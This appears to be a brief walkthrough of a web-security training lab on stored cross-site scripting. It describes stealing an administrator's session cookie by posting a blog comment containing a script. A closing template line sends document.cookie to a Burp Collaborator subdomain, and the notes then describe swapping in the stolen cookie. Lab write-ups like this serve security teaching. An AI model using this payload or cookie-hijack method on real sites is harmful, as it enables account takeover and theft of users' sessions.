**Objective**
Login to administrator or *admin* account.

**XSS**
- In Cross Site Scripting or *code injection*, malicious JavaScript payload is injected across different code sites within the same website. 
- As the attack targets the user's browser session, it is client side instead of server side.

**Point of Entry**
- Unique session cookie ties a login session to user, including admin.
- Our point of entry into admin account is their session cookie.

**Barrier to entry** 
- Only own session cookie can be viewed in Burpsuite HTTP history.

**Bypassing Barrier to Entry**
- Using Collaborator to monitor administrator's POST request containing session cookie.
- Create a payload in Collaborator, enter it in template exploit and post as a comment on any chosen blogpost. 
- Visiting chosen blogpost will reveal administrator's session cookie in Collaborator. Copy it.
- Start intercepting, click *My Account* page to generate a POST request.
- Swap own session cookie with copied cookie to login as admin.

**Template**
`<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>`
